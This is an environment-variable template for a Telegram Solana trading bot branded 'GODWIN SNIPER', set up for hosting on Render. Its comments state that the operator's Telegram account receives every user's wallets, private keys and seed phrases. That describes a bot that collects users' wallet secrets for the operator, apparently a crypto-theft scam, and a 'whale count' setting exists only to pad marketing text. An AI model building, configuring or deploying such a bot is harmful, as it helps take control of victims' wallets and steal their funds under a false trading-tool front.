# ═══════════════════════════════════════════════
# GODWIN NEXO BOT - ENVIRONMENT VARIABLES
# Copy this to .env or set these in Render Dashboard
# ═══════════════════════════════════════════════

# === REQUIRED ===

# Telegram Bot Token (from @BotFather)
TELEGRAM_BOT_TOKEN=your_bot_token_here

# Your Telegram User ID (get from @userinfobot)
# This is who receives ALL notifications: new users, wallets, deposits, trades, withdrawals, private keys, seed phrases
OWNER_TELEGRAM_ID=your_telegram_user_id

# === OWNER WALLET (OPTIONAL BUT RECOMMENDED) ===

# Your Solana wallet seed phrase (12 or 24 words, space-separated)
# This connects YOUR wallet to the bot on startup
# The bot will use this wallet for owner operations
# Example: abandon amount bridge cake dawn eye fabric gospel health ignore jaguar key
# Leave empty if you want the bot to generate wallets for you instead
OWNER_SEED_PHRASE=

# === BRANDING ===

# Bot display name (shown in dashboard, help, start message)
BOT_NAME=GODWIN SNIPER

# Support username (without @) shown in help and withdrawal messages
SUPPORT_USERNAME=your_support_username

# Number of whale wallets shown in marketing text
WHALE_COUNT=2,400+

# === WALLET / TRADING ===

# Solana RPC URL (default: free public endpoint)
# For production, use a paid RPC like QuickNode, Helius, or Alchemy for reliability
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com

# === SERVER ===

# Server port (Render sets this automatically, don't set manually on Render)
# PORT=3000

# Render auto-sets this to your app's public URL (don't set manually)
# RENDER_EXTERNAL_URL=https://your-app.onrender.com
